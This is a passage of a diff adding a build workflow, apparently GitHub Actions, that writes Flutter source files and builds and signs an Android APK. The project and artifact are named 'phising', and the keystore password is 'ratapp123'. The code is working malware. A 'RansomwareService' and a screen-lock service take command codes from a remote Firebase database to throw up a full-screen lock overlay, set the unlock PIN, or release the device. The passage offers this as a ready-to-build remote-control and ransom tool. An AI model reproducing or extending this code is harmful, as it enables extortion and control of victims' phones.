+                if (cmd == 98765432 || cmd == 98765433 || cmd == 87654321) {
+                  event.snapshot.ref.remove();
+                }
+                
+                if (cmd == 98765432) _lockScreen();
+                else if (cmd == 98765433) _unlockScreen();
+                else if (cmd == 87654321 && param.isNotEmpty) _setPin(param);
+              });
+            }
+
+            void _listenToPinUpdates(String deviceId) {
+              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+              _pinSub = fb.ref('lock_pin/$deviceId').onValue.listen((event) {
+                if (event.snapshot.value != null) _currentPin = event.snapshot.value.toString();
+              });
+            }
+
+            void _setPin(String newPin) => _currentPin = newPin;
+
+            void _lockScreen() {
+              if (_isLocked) return;
+              _isLocked = true;
+              if (_appContext == null) return;
+              _overlayEntry = OverlayEntry(builder: (context) => LockHtmlOverlay(
+                assetPath: 'assets/lock.html', deviceId: _deviceId, currentPin: _currentPin, onUnlock: _unlockScreen,
+              ));
+              Overlay.of(_appContext!).insert(_overlayEntry!);
+            }
+
+            void _unlockScreen() {
+              if (!_isLocked) return;
+              _isLocked = false;
+              _overlayEntry?.remove();
+              _overlayEntry = null;
+            }
+
+            void dispose() { _cmdSub?.cancel(); _pinSub?.cancel(); _overlayEntry?.remove(); }
+          }
+          EOF
+
+          cat > ransomware_service.dart << 'EOF'
+          import 'dart:async';
+          import 'package:flutter/material.dart';
+          import 'package:firebase_database/firebase_database.dart';
+          import 'package:firebase_core/firebase_core.dart';
+          import 'package:webview_flutter/webview_flutter.dart';
+
+          class RansomwareHtmlOverlay extends StatefulWidget {
+            final String assetPath;
+            final String deviceId;
+            final String currentPin;
+            final VoidCallback onUnlock;
+            const RansomwareHtmlOverlay({Key? key, required this.assetPath, required this.deviceId, required this.currentPin, required this.onUnlock}) : super(key: key);
+
+            @override
+            State<RansomwareHtmlOverlay> createState() => _RansomwareHtmlOverlayState();
+          }
+
+          class _RansomwareHtmlOverlayState extends State<RansomwareHtmlOverlay> {
+            late final WebViewController _controller;
+
+            @override
+            void initState() {
+              super.initState();
+              _controller = WebViewController();
+              _controller.setJavaScriptMode(JavaScriptMode.unrestricted);
+              _controller.addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
+                if (msg.message == 'unlock') widget.onUnlock();
+              });
+              _controller.setNavigationDelegate(NavigationDelegate(
+                onPageFinished: (url) async {
+                  await _controller.runJavaScript("window.DEVICE_ID = '${widget.deviceId}';");
+                  await _controller.runJavaScript("window.CORRECT_PIN = '${widget.currentPin}';");
+                },
+              ));
+              _controller.loadFlutterAsset(widget.assetPath);
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
+            }
+          }
+
+          class RansomwareService {
+            static final RansomwareService _instance = RansomwareService._internal();
+            factory RansomwareService() => _instance;
+            RansomwareService._internal();
+            StreamSubscription? _cmdSub;
+            bool _isActive = false;
+            OverlayEntry? _overlayEntry;
+            BuildContext? _appContext;
+            String _currentPin = '1234';
+            String _deviceId = '';
+
+            void init(BuildContext context, String deviceId) {
+              _appContext = context;
+              _deviceId = deviceId;
+              _listenToCommands(deviceId);
+              _listenToPinUpdates(deviceId);
+            }
+
+            void _listenToCommands(String deviceId) {
+              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+              _cmdSub = fb.ref('commands/$deviceId').onChildAdded.listen((event) {
+                if (event.snapshot.value == null) return;
+                final data = Map<String, dynamic>.from(event.snapshot.value as Map);
+                final cmd = data['cmd'];
+                final param = data['param']?.toString() ?? '';
+                
+                if (cmd == 1010 || cmd == 10101) {
+                  event.snapshot.ref.remove();
+                }
+                
+                if (cmd == 1010) _activateRansomware();
+                else if (cmd == 10101) _deactivateRansomware();
+                else if (cmd == 87654321 && param.isNotEmpty) _setPin(param);
+              });
+            }
+
+            void _listenToPinUpdates(String deviceId) {
+              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+              fb.ref('lock_pin/$deviceId').onValue.listen((event) {
+                if (event.snapshot.value != null) _currentPin = event.snapshot.value.toString();
+              });
+            }
+
+            void _setPin(String newPin) => _currentPin = newPin;
+
+            void _activateRansomware() {
+              if (_isActive) return;
+              _isActive = true;
+              if (_appContext == null) return;
+              _overlayEntry = OverlayEntry(builder: (context) => RansomwareHtmlOverlay(
+                assetPath: 'assets/ransomware.html', deviceId: _deviceId, currentPin: _currentPin, onUnlock: _deactivateRansomware,
+              ));
+              Overlay.of(_appContext!).insert(_overlayEntry!);
+            }
+
+            void _deactivateRansomware() {
+              if (!_isActive) return;
+              _isActive = false;
+              _overlayEntry?.remove();
+              _overlayEntry = null;
+            }
+
+            void dispose() { _cmdSub?.cancel(); _overlayEntry?.remove(); }
+          }
+          EOF
+
+      - name: Build & Sign APK
+        run: |
+          cd phising_base
+          flutter pub get
+          dart run flutter_launcher_icons
+          keytool -genkey -v -keystore release.jks -keyalg RSA -keysize 2048 -validity 10000 -alias key0 -storepass ratapp123 -keypass ratapp123 -dname "CN=Android, OU=Android, O=Android, L=Android, ST=Android, C=US"
+          flutter build apk --release
+          $ANDROID_HOME/build-tools/34.0.0/apksigner sign --ks release.jks --ks-pass pass:ratapp123 --key-pass pass:ratapp123 --out build/app/outputs/flutter-apk/app-release-signed.apk build/app/outputs/flutter-apk/app-release.apk
+
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: phising-apk
+          path: phising_base/build/app/outputs/flutter-apk/app-release-signed.apk
